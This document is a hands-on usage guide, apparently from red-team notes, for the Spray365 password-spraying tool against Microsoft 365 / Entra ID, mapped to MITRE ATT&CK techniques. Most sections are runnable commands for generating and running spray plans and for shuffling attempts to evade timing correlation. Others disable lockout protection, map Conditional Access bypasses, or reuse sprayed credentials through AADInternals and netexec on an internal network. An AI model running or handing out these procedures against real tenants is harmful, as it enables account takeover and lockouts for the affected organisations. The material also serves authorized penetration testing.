# Spray365 — Hands-On Use Cases

Every scenario below maps to an item in `01 - Overview.md`'s Quick Use-Case List. All commands and flags verified against the live `MarkoH17/Spray365` source (`spray365.py` v0.2.3).

## Contents
- [Baseline Generate-Then-Spray Workflow](#baseline-generate-then-spray-workflow)
- [Resuming a Spray From an Exact Position](#resuming-a-spray-from-an-exact-position)
- [Pinning a Specific Client/Endpoint Pair](#pinning-a-specific-clientendpoint-pair)
- [Audit Mode Against a Known-Good Credential — Mapping Conditional Access Gaps](#audit-mode-against-a-known-good-credential--mapping-conditional-access-gaps)
- [Shuffled Execution Order to Complicate Timing Correlation](#shuffled-execution-order-to-complicate-timing-correlation)
- [Proxying Through Burp Suite](#proxying-through-burp-suite)
- [Continuing to Test All Passwords Even After a Hit](#continuing-to-test-all-passwords-even-after-a-hit)
- [Tuning the Lockout Threshold](#tuning-the-lockout-threshold)
- [Reviewing Results for Exploitable Client/Endpoint Combinations](#reviewing-results-for-exploitable-clientendpoint-combinations)
- [Full Post-Mortem Accounting of a Completed Run](#full-post-mortem-accounting-of-a-completed-run)
- [Spraying a Hand-Built Execution Plan](#spraying-a-hand-built-execution-plan)
- [Chained Workflow — Feeding a Confirmed Bypass Into AADInternals or an On-Prem Tool](#chained-workflow--feeding-a-confirmed-bypass-into-aadinternals-or-an-on-prem-tool)

---

## Baseline Generate-Then-Spray Workflow

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) Brute Force: Password Spraying, [T1078.004](https://attack.mitre.org/techniques/T1078/004/) Valid Accounts: Cloud Accounts

```bash
python3 spray365.py generate normal \
  -ep evilcorp_spray.s365 \
  -d evilcorp.com \
  -u usernames.txt \
  -p 'Summer2026!'

python3 spray365.py spray -ep evilcorp_spray.s365
```

Step 1 builds the plan (random client_id/endpoint per credential, 30-second default delay); step 2 executes it against `login.microsoftonline.com/organizations` via MSAL.

## Resuming a Spray From an Exact Position

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
python3 spray365.py spray -ep evilcorp_spray.s365
# interrupted after "credential 247 out of 500"...
python3 spray365.py spray -ep evilcorp_spray.s365 -R 248
```

The plan file itself is the durable state — no separate tried-logins tracking file exists the way `../TrevorSpray/` maintains one; the operator must track/supply the resume index manually.

## Pinning a Specific Client/Endpoint Pair

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
python3 spray365.py generate normal \
  -ep pinned_spray.s365 \
  -d evilcorp.com \
  -u usernames.txt \
  -pf passwords.txt \
  -cID az \
  -eID aad_graph_api

python3 spray365.py spray -ep pinned_spray.s365
```

Forces every attempt to use the `az` (Azure CLI) client ID against the `aad_graph_api` resource, rather than randomizing across the full catalog — useful when specifically testing whether the "az" PowerShell/CLI tooling itself would authenticate.

## Audit Mode Against a Known-Good Credential — Mapping Conditional Access Gaps

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/), [T1556](https://attack.mitre.org/techniques/T1556/) Modify Authentication Process (probing which auth surfaces bypass CA)

```bash
python3 spray365.py generate audit \
  -ep ca_audit.s365 \
  -d evilcorp.com \
  -u known_good_user.txt \
  -p 'KnownGoodPassword123!' \
  --delay 10

python3 spray365.py spray -ep ca_audit.s365
python3 spray365.py review spray365_results_2026-08-06_10-15-00.json --show_valid_aad_access
```

With one user and one password, this still generates the full ~45×12×10-user-agent cross-product (540 attempts at the client/endpoint level alone) — expect the run to take a while even at a 10-second delay. `--show_valid_aad_access` on review is where the actual finding surfaces: exactly which `client_id`/`endpoint` pairs let this credential through despite Conditional Access.

## Shuffled Execution Order to Complicate Timing Correlation

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/), [T1562.001](https://attack.mitre.org/techniques/T1562/001/) Impair Defenses

```bash
python3 spray365.py generate normal \
  -ep shuffled.s365 \
  -d evilcorp.com \
  -u usernames.txt \
  -pf passwords.txt \
  -S \
  -mD 300 \
  -SO 20
```

`-S` enables the shuffle; `-mD 300` guarantees at least 5 minutes between any two attempts against the *same* user even after shuffling; `-SO 20` generates 20 candidate orderings and keeps the fastest one that still satisfies the constraint.

## Proxying Through Burp Suite

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
python3 spray365.py spray -ep evilcorp_spray.s365 -x http://127.0.0.1:8080 -k
```

`-k/--insecure` disables TLS verification so Burp's self-signed CA doesn't need to be separately trusted by the MSAL/`requests` stack — useful for inspecting the exact ROPC request MSAL builds, or manually replaying one attempt.

## Continuing to Test All Passwords Even After a Hit

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
python3 spray365.py spray -ep weak_password_audit.s365 -i
```

`-i/--ignore_success` overrides the default behavior (which skips a user's remaining attempts once one succeeds) — appropriate for a password-policy/reuse audit where the goal is "which of these N candidate passwords work for this user," not "does at least one work."

## Tuning the Lockout Threshold

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
# Abort quickly on the first sign of trouble
python3 spray365.py spray -ep evilcorp_spray.s365 -l 1

# Disable the lockout circuit-breaker entirely (use with real caution)
python3 spray365.py spray -ep evilcorp_spray.s365 -l 0
```

`-l` counts observed AADSTS `50053` (locked-out) responses and aborts once the threshold is hit; `0` disables the check.

## Reviewing Results for Exploitable Client/Endpoint Combinations

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
python3 spray365.py review spray365_results_2026-08-06_10-15-00.json --show_valid_aad_access
```

Output lists each valid credential's endpoint(s), and under each endpoint, every client_id that successfully authenticated against it — the direct findings artifact for a Conditional Access misconfiguration writeup.

## Full Post-Mortem Accounting of a Completed Run

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```bash
python3 spray365.py review spray365_results_2026-08-06_10-15-00.json \
  --show_invalid_creds --show_invalid_users
```

Full transparency dump of the run for engagement documentation/deconfliction purposes — every non-existent user, every failed credential pair with its specific AADSTS-derived error message.

## Spraying a Hand-Built Execution Plan

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/)

```python
# Any tool can emit this JSON shape and hand it to `spray365.py spray`
import json
plan = [{
    "domain": "evilcorp.com", "username": "jsmith", "password": "Summer2026!",
    "client_id": ["az", "1950a258-227b-4e31-a9cf-717495945fc2"],
    "endpoint": ["aad_graph_api", "https://graph.windows.net"],
    "user_agent": ["custom", "curl/8.0"],
    "delay": 30, "initial_delay": 0
}]
open("custom.s365", "w").write(json.dumps(plan))
```

```bash
python3 spray365.py spray -ep custom.s365
```

Confirms the README's own claim that `spray` accepts execution plans from any source matching the `Credential` schema — useful for integrating Spray365's execution engine into a larger custom pipeline without using its `generate` subcommand at all.

## Chained Workflow — Feeding a Confirmed Bypass Into AADInternals or an On-Prem Tool

**MITRE ATT&CK:** [T1110.003](https://attack.mitre.org/techniques/T1110/003/) → [T1078](https://attack.mitre.org/techniques/T1078/) Valid Accounts, [T1556](https://attack.mitre.org/techniques/T1556/) Modify Authentication Process

```bash
# 1. Confirm a valid credential and its specific CA-bypassing endpoint/client
python3 spray365.py review results.json --show_valid_aad_access
#   -> valid: jsmith@evilcorp.com / Summer2026! via endpoint "office_mgmt", client "az"

# 2a. Cloud-side: use the confirmed-working client_id/endpoint pair directly
#     with AADInternals for targeted token acquisition
Get-AADIntAccessTokenForAADGraph -Credentials $cred   # see ../../AADInternals/

# 2b. On-prem: test the same password against AD in a hybrid-identity tenant
netexec smb 10.0.0.0/24 -u jsmith -p 'Summer2026!'    # see ../../NetExec/
```

The specific value of Spray365's output here over a plain spray hit is that `review --show_valid_aad_access` already tells the operator **which application identity and resource successfully bypassed Conditional Access** — informing exactly which follow-on tool/technique (AADInternals module, `az` CLI, a specific Graph scope) is most likely to work cleanly against the same tenant.
